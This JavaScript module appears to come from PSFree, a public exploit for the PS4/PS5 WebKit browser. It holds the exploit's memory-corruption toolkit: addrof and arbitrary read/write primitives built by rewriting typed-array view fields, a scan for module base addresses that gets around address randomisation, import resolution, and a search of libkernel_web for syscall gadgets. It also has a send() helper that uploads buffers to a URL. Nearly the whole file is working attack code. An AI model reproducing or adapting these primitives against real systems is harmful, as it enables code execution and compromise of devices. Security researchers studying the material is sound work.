/* Copyright (C) 2023 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

// import { Int } from './int64.mjs';


function die(msg) {
    alert(msg);
    undefinedFunction();
}

function debug_log(msg) {
    // let textNode = document.createTextNode(msg);
    // let node = document.createElement("p").appendChild(textNode);

    // document.body.appendChild(node);
    // document.body.appendChild(document.createElement("br"));
    print(msg);
}

function clear_log() {
    // document.body.innerHTML = null;
}

function str2array(str, length, offset) {
    if (offset === undefined) {
        offset = 0;
    }
    let a = new Array(length);
    for (let i = 0; i < length; i++) {
        a[i] = str.charCodeAt(i + offset);
    }
    return a;
}

// alignment must be 32 bits and is a power of 2
function align(a, alignment) {
    if (!(a instanceof Int)) {
        a = new Int(a);
    }
    const mask = -alignment & 0xffffffff;
    let type = a.constructor;
    let low = a.low() & mask;
    return new type(low, a.high());
}

async function send(url, buffer, file_name, onload=() => {}) {
    const file = new File(
        [buffer],
        file_name,
        {type:'application/octet-stream'}
    );
    const form = new FormData();
    form.append('upload', file);

    debug_log('send');
    const response = await fetch(url, {method: 'POST', body: form});

    if (!response.ok) {
        throw Error(`Network response was not OK, status: ${response.status}`);
    }
    onload();
}

const KB = 1024;
const MB = KB * KB;
const GB = KB * KB * KB;

function check_range(x) {
    return (-0x80000000 <= x) && (x <= 0xffffffff);
}

function unhexlify(hexstr) {
    if (hexstr.substring(0, 2) === "0x") {
        hexstr = hexstr.substring(2);
    }
    if (hexstr.length % 2 === 1) {
        hexstr = '0' + hexstr;
    }
    if (hexstr.length % 2 === 1) {
        throw TypeError("Invalid hex string");
    }

    let bytes = new Uint8Array(hexstr.length / 2);
    for (let i = 0; i < hexstr.length; i += 2) {
        let new_i = hexstr.length - 2 - i;
        let substr = hexstr.slice(new_i, new_i + 2);
        bytes[i / 2] = parseInt(substr, 16);
    }

    return bytes;
}

// Decorator for Int instance operations. Takes care
// of converting arguments to Int instances if required.
function operation(f, nargs) {
    return function () {
        if (arguments.length !== nargs)
            throw Error("Not enough arguments for function " + f.name);
        let new_args = [];
        for (let i = 0; i < arguments.length; i++) {
            if (!(arguments[i] instanceof Int)) {
                new_args[i] = new Int(arguments[i]);
            } else {
                new_args[i] = arguments[i];
            }
        }
        return f.apply(this, new_args);
    };
}

class Int {
    constructor(low, high) {
        let buffer = new Uint32Array(2);
        let bytes = new Uint8Array(buffer.buffer);

        if (arguments.length > 2) {
            throw TypeError('Int takes at most 2 args');
        }
        if (arguments.length === 0) {
            throw TypeError('Int takes at min 1 args');
        }
        let is_one = false;
        if (arguments.length === 1) {
            is_one = true;
        }

        if (!is_one) {
            if (typeof (low) !== 'number'
                && typeof (high) !== 'number') {
                throw TypeError('low/high must be numbers');
            }
        }

        if (typeof low === 'number') {
            if (!check_range(low)) {
                throw TypeError('low not a valid value: ' + low);
            }
            if (is_one) {
                high = 0;
                if (low < 0) {
                    high = -1;
                }
            } else {
                if (!check_range(high)) {
                    throw TypeError('high not a valid value: ' + high);
                }
            }
            buffer[0] = low;
            buffer[1] = high;
        } else if (typeof low === 'string') {
            bytes.set(unhexlify(low));
        } else if (typeof low === 'object') {
            if (low instanceof Int) {
                bytes.set(low.bytes);
            } else {
                if (low.length !== 8)
                    throw TypeError("Array must have exactly 8 elements.");
                bytes.set(low);
            }
        } else {
            throw TypeError('Int does not support your object for conversion');
        }

        this.buffer = buffer;
        this.bytes = bytes;

        this.eq = operation(function eq(b) {
            const a = this;
            return a.low() === b.low() && a.high() === b.high();
        }, 1);

        this.neg = operation(function neg() {
            let type = this.constructor;

            let low = ~this.low();
            let high = ~this.high();

            let res = (new Int(low, high)).add(1);

            return new type(res);
        }, 0);

        this.add = operation(function add(b) {
            let type = this.constructor;

            let low = this.low();
            let high = this.high();

            low += b.low();
            let carry = 0;
            if (low > 0xffffffff) {
                carry = 1;
            }
            high += carry + b.high();

            low &= 0xffffffff;
            high &= 0xffffffff;

            return new type(low, high);
        }, 1);

        this.sub = operation(function sub(b) {
            let type = this.constructor;

            b = b.neg();

            let low = this.low();
            let high = this.high();

            low += b.low();
            let carry = 0;
            if (low > 0xffffffff) {
                carry = 1;
            }
            high += carry + b.high();

            low &= 0xffffffff;
            high &= 0xffffffff;

            return new type(low, high);
        }, 1);
    }

    low() {
        return this.buffer[0];
    }

    high() {
        return this.buffer[1];
    }

    toString(is_pretty) {
        if (!is_pretty) {
            let low = this.low().toString(16).padStart(8, '0');
            let high = this.high().toString(16).padStart(8, '0');
            return '0x' + high + low;
        }
        let high = this.high().toString(16).padStart(8, '0');
        high = high.substring(0, 4) + '_' + high.substring(4);

        let low = this.low().toString(16).padStart(8, '0');
        low = low.substring(0, 4) + '_' + low.substring(4);
        return '0x' + high + '_' + low;
    }
}

Int.Zero = new Int(0);
Int.One = new Int(1);

let mem = null;

function init_module(memory) {
    mem = memory;
}

class Addr extends Int {
    read8(offset) {
        const addr = this.add(offset);
        return mem.read8(addr);
    }

    read16(offset) {
        const addr = this.add(offset);
        return mem.read16(addr);
    }

    read32(offset) {
        const addr = this.add(offset);
        return mem.read32(addr);
    }

    read64(offset) {
        const addr = this.add(offset);
        return mem.read64(addr);
    }

    // returns a pointer instead of an Int
    readp(offset) {
        const addr = this.add(offset);
        return mem.readp(addr);
    }

    write8(offset, value) {
        const addr = this.add(offset);

        mem.write8(addr, value);
    }

    write16(offset, value) {
        const addr = this.add(offset);

        mem.write16(addr, value);
    }

    write32(offset, value) {
        const addr = this.add(offset);

        mem.write32(addr, value);
    }

    write64(offset, value) {
        const addr = this.add(offset);

        mem.write64(addr, value);
    }
}

class MemoryBase {
    _addrof(obj) {
        if (typeof obj !== 'object'
            && typeof obj !== 'function'
        ) {
            throw TypeError('addrof argument not a JS object');
        }
        this.worker.a = obj;
        write64(this.main, view_m_vector, this.butterfly.sub(0x10));
        let res = read64(this.worker, 0);
        write64(this.main, view_m_vector, this._current_addr);

        return res;
    }

    addrof(obj) {
        return new Addr(this._addrof(obj));
    }

    set_addr(addr) {
        if (!(addr instanceof Int)) {
            throw TypeError('addr must be an Int');
        }
        this._current_addr = addr;
        write64(this.main, view_m_vector, this._current_addr);
    }

    get_addr() {
        return this._current_addr;
    }

    // write0() is for when you want to write to address 0. You can't use for
    // example: "mem.write32(Int.Zero, 0)", since you can't set by index the
    // view when it isDetached(). isDetached() == true when m_mode >=
    // WastefulTypedArray and m_vector == 0.
    //
    // Functions like write32() will index mem.worker via write() from rw.mjs.
    //
    // size is the number of bits to read/write.
    //
    // The constraint is 0 <= offset + 1 < 2**32.
    //
    // PS4 firmwares >= 9.00 and any PS5 version can write to address 0
    // directly. All firmwares (PS4 and PS5) can read address 0 directly.
    //
    // See setIndex() from
    // WebKit/Source/JavaScriptCore/runtime/JSGenericTypedArrayView.h at PS4
    // 8.03 for more information. Affected firmwares will get this error:
    //
    // TypeError: Underlying ArrayBuffer has been detached from the view
    write0(size, offset, value) {
        const i = offset + 1;
        if (i >= 2**32 || i < 0) {
            throw RangeError(`read0() invalid offset: ${offset}`);
        }

        this.set_addr(new Int(-1));

        switch (size) {
            case 8: {
                this.worker[i] = value;
            }
            case 16: {
                write16(this.worker, i, value);
            }
            case 32: {
                write32(this.worker, i, value);
            }
            case 64: {
                write64(this.worker, i, value);
            }
            default: {
                throw RangeError(`write0() invalid size: ${size}`);
            }
        }
    }

    read8(addr) {
        this.set_addr(addr);
        return this.worker[0];
    }

    read16(addr) {
        this.set_addr(addr);
        return read16(this.worker, 0);
    }

    read32(addr) {
        this.set_addr(addr);
        return read32(this.worker, 0);
    }

    read64(addr) {
        this.set_addr(addr);
        return read64(this.worker, 0);
    }

    // returns a pointer instead of an Int
    readp(addr) {
        return new Addr(this.read64(addr));
    }

    write8(addr, value) {
        this.set_addr(addr);
        this.worker[0] = value;
    }

    write16(addr, value) {
        this.set_addr(addr);
        write16(this.worker, 0, value);
    }

    write32(addr, value) {
        this.set_addr(addr);
        write32(this.worker, 0, value);
    }

    write64(addr, value) {
        this.set_addr(addr);
        write64(this.worker, 0, value);
    }
}

class Memory extends MemoryBase {
    constructor(main, worker)  {
        super();

        this.main = main;
        this.worker = worker;

        // The initial creation of the "a" property will change the butterfly
        // address. Do it now so we can cache it for addrof().
        worker.a = 0; // dummy value, we just want to create the "a" property
        this.butterfly = read64(main, js_butterfly);

        write32(main, view_m_length, 0xffffffff);

        this._current_addr = Int.Zero;

        init_module(this);
    }
}

function make_buffer(addr, size) {
    // see enum TypedArrayMode from
    // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferView.h
    // at webkitgtk 2.34.4
    //
    // see possiblySharedBuffer() from
    // WebKit/Source/JavaScriptCore/runtime/JSArrayBufferViewInlines.h
    // at webkitgtk 2.34.4
    //
    // Views with m_mode < WastefulTypedArray don't have an ArrayBuffer object
    // associated with them, if we ask for view.buffer, the view will be
    // converted into a WastefulTypedArray and an ArrayBuffer will be created.
    //
    // We will create an OversizeTypedArray via requesting an Uint8Array whose
    // number of elements will be greater than fastSizeLimit (1000).
    //
    // We will not use a FastTypedArray since its m_vector is visited by the
    // GC and we will temporarily change it. The GC expects addresses from the
    // JS heap, and that heap has metadata that the GC uses. The GC will likely
    // crash since valid metadata won't likely be found at arbitrary addresses.
    //
    // The FastTypedArray approach will have a small time frame where the GC
    // can inspect the invalid m_vector field.
    //
    // Views created via "new TypedArray(x)" where "x" is a number will always
    // have an m_mode < WastefulTypedArray.
    const u = new Uint8Array(1001);
    const u_addr = mem.addrof(u);

    // we won't change the butterfly and m_mode so we won't save those
    const old_addr = u_addr.read64(view_m_vector);
    const old_size = u_addr.read32(view_m_length);

    u_addr.write64(view_m_vector, addr);
    u_addr.write32(view_m_length, size);

    const copy = new Uint8Array(u.length);
    copy.set(u);

    // We can't use slowDownAndWasteMemory() on u since that will create a
    // JSC::ArrayBufferContents with its m_data pointing to addr. On the
    // ArrayBuffer's death, it will call WTF::fastFree() on m_data. This can
    // cause a crash if the m_data is not from the fastMalloc heap, and even if
    // it is, freeing abitrary addresses is dangerous as it may lead to a
    // use-after-free.
    const res = copy.buffer;

    // restore
    u_addr.write64(view_m_vector, old_addr);
    u_addr.write32(view_m_length, old_size);

    return res;
}

// these values came from analyzing dumps from CelesteBlue
function check_magic_at(p, is_text) {
    // byte sequence that is very likely to appear at offset 0 of a .text
    // segment
    const text_magic = [
        new Int([0x55, 0x48, 0x89, 0xe5, 0x41, 0x57, 0x41, 0x56]),
        new Int([0x41, 0x55, 0x41, 0x54, 0x53, 0x50, 0x48, 0x8d]),
    ];

    // the .data "magic" is just a portion of the PT_SCE_MODULE_PARAM segment

    // .data magic from 3.00, 6.00, and 6.20
    //const data_magic = [
    //    new Int(0x18),
    //    new Int(0x3c13f4bf, 0x1),
    //];

    // .data magic from 8.00 and 8.03
    const data_magic = [
        new Int(0x20),
        new Int(0x3c13f4bf, 0x2),
    ];

    const magic = is_text ? text_magic : data_magic;
    const value = [p.read64(0), p.read64(8)];

    return value[0].eq(magic[0]) && value[1].eq(magic[1]);
}

// Finds the base address of a segment: .text or .data
// Used on the ps4 to locate module base addresses
// * p:
//     an address pointing somewhere in the segment to search
// * is_text:
//     whether the segment is .text or .data
// * is_back:
//     whether to search backwards (to lower addresses) or forwards
//
// Modules are likely to be separated by a couple of unmapped pages because of
// Address Space Layout Randomization (all module base addresses are
// randomized). This means that this function will either succeed or crash on
// a page fault, if the magic is not present.
//
// To be precise, modules are likely to be "surrounded" by unmapped pages, it
// does not mean that the distance between a boundary of a module and the
// nearest unmapped page is 0.
//
// The boundaries of a module is its base and end addresses.
//
// let module_base_addr = find_base(...);
// // Not guaranteed to crash, the nearest unmapped page is not necessarily at
// // 0 distance away from module_base_addr.
// addr.read8(-1);
//
function find_base(addr, is_text, is_back) {
    // ps4 page size
    const page_size = 16 * KB;
    // align to page size
    addr = align(addr, page_size);
    const offset = (is_back ? -1 : 1) * page_size;
    while (true) {
        if (check_magic_at(addr, is_text)) {
            break;
        }
        addr = addr.add(offset)
    }
    return addr;
}

// gets the address of the underlying buffer of a JSC::JSArrayBufferView
function get_view_vector(view) {
    if (!ArrayBuffer.isView(view)) {
        throw TypeError(`object not a JSC::JSArrayBufferView: ${view}`);
    }
    return mem.addrof(view).readp(view_m_vector);
}

function resolve_import(import_addr) {
    if (import_addr.read16(0) !== 0x25ff) {
        throw Error(
            `instruction at ${import_addr} is not of the form: jmp qword`
            + ' [rip + X]'
        );
    }
    // module_function_import:
    //     jmp qword [rip + X]
    //     ff 25 xx xx xx xx // signed 32-bit displacement
    const disp = import_addr.read32(2);
    // sign extend
    const offset = new Int(disp, disp >> 31);
    // The rIP value used by "jmp [rip + X]" instructions is actually the rIP
    // of the next instruction. This means that the actual address used is
    // [rip + X + sizeof(jmp_insn)], where sizeof(jmp_insn) is the size of the
    // jump instruction, which is 6 in this case.
    const function_addr = import_addr.readp(offset.add(6));

    return function_addr;
}

function init_syscall_array(
    syscall_array,
    libkernel_web_base,
    max_search_size,
) {
    if (typeof max_search_size !== 'number') {
        throw TypeError(`max_search_size is not a number: ${max_search_size}`);
    }
    if (max_search_size < 0) {
        throw Error(`max_search_size is less than 0: ${max_search_size}`);
    }

    const libkernel_web_buffer = make_buffer(
        libkernel_web_base,
        max_search_size,
    );
    const kbuf = new Uint8Array(libkernel_web_buffer);

    // Search 'rdlo' string from libkernel_web's .rodata section to gain an
    // upper bound on the size of the .text section.
    let text_size = 0;
    let found = false;
    for (let i = 0; i < max_search_size; i++) {
        if (kbuf[i] === 0x72
            && kbuf[i + 1] === 0x64
            && kbuf[i + 2] === 0x6c
            && kbuf[i + 3] === 0x6f
        ) {
            text_size = i;
            found = true;
            break;
        }
    }
    if (!found) {
        throw Error(
            '"rdlo" string not found in libkernel_web, base address:'
            + ` ${libkernel_web_base}`
        );
    }

    // search for the instruction sequence:
    // syscall_X:
    //     mov rax, X
    //     mov r10, rcx
    //     syscall
    for (let i = 0; i < text_size; i++) {
        if (kbuf[i] === 0x48
            && kbuf[i + 1] === 0xc7
            && kbuf[i + 2] === 0xc0
            && kbuf[i + 7] === 0x49
            && kbuf[i + 8] === 0x89
            && kbuf[i + 9] === 0xca
            && kbuf[i + 10] === 0x0f
            && kbuf[i + 11] === 0x05
        ) {
            const syscall_num = read32(kbuf, i + 3);
            syscall_array[syscall_num] = libkernel_web_base.add(i);
            // skip the sequence
            i += 11;
        }
    }
}

function read(u8_view, offset, size) {
    let res = 0;
    for (let i = 0; i < size; i++) {
        res += u8_view[offset + i] << i*8;
    }
    // << returns a signed integer, >>> converts it to unsigned
    return res >>> 0;
}

function read16(u8_view, offset) {
    return read(u8_view, offset, 2);
}

function read32(u8_view, offset) {
    return read(u8_view, offset, 4);
}

function read64(u8_view, offset) {
    let res = [];
    for (let i = 0; i < 8; i++) {
        res.push(u8_view[offset + i]);
    }
    return new Int(res);
}

// for writes less than 8 bytes
function write(u8_view, offset, value, size) {
    for (let i = 0; i < size; i++) {
        u8_view[offset + i]  = (value >>> i*8) & 0xff;
    }
}

function write16(u8_view, offset, value) {
    write(u8_view, offset, value, 2);
}

function write32(u8_view, offset, value) {
    write(u8_view, offset, value, 4);
}

function write64(u8_view, offset, value) {
    if (!(value instanceof Int)) {
        throw TypeError('write64 value must be an Int');
    }

    let low = value.low();
    let high = value.high();

    for (let i = 0; i < 4; i++) {
        u8_view[offset + i]  = (low >>> i*8) & 0xff;
    }
    for (let i = 0; i < 4; i++) {
        u8_view[offset + 4 + i]  = (high >>> i*8) & 0xff;
    }
}

function sread64(str, offset) {
    let res = [];
    for (let i = 0; i < 8; i++) {
        res.push(str.charCodeAt(offset + i));
    }
    return new Int(res);
}
